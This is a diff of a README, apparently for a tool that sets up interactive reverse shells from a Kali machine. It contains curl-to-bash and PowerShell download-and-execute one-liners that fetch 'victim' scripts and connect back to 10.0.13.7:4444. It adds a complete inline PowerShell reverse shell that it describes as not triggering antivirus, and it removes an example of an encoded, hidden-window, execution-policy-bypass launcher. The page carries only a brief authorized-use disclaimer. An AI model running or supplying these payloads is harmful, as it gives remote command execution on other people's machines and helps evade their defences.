@@ -51,10 +51,17 @@ If you cannot upload the script to the target machine, you can fetch it directly
 ```bash
 curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh | bash -s -- 10.0.13.7 4444
 ```
+This one triggers the antivirus....
 ```powershell
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1'); & {windows_victim 10.0.13.7 4444}"
 
+``` 
+This one doesn't......
+
+```powershell
+$IP="10.0.13.7"; $P=4444; try { $h=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$h.GetStream(); $b=[System.Text.Encoding]::ASCII.GetBytes("WINDOWS_SHELL`n"); $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 500; $h.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); $w.WriteLine("[+] Windows Shell Established."); while($c.Connected) { $w.Write("`r`nPS " + (pwd).Path + "> "); $t=$r.ReadLine(); if($t) { try { $o=(IEX $t 2>&1 | Out-String); $w.Write($o) } catch { $w.WriteLine("Error: " + $_.Exception.Message) } } }; $c.Close() } catch { Write-Host "[!] Connection Refused" -ForegroundColor Red }
 ```
+
 ## ⚠️ Recovery
 If the session ends and your terminal stops displaying your typing, type reset and press Enter to restore your local environment.
 ```bash
@@ -65,13 +72,3 @@ reset
 Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
 ------------------------------
 
-
-```text
-┌──(dperez㉿kali)-[~/Desktop/kali_interactive_tty]
-└─$ ./obfuscate_ps.sh 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1"); windows_victim 10.0.13.7 4444'
-
-
-[+] Evasive PowerShell Command Generated:
-
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AeAA4ADYAZABhAHYAaQBkAC8AbQB1AGwAdABpAHAAbABhAHQAZgBvAHIAbQBfAGsAYQBsAGkAXwBpAG4AdABlAHIAYQBjAHQAaQB2AGUAXwB0AHQAeQAvAG0AYQBzAHQAZQByAC8AdwBpAG4AZABvAHcAcwBfAHYAaQBjAHQAaQBtAC4AcABzADEAIgApADsAIAB3AGkAbgBkAG8AdwBzAF8AdgBpAGMAdABpAG0AIAAxADAALgAwAC4AMQAzAC4ANwAgADQANAA0ADQA
-```
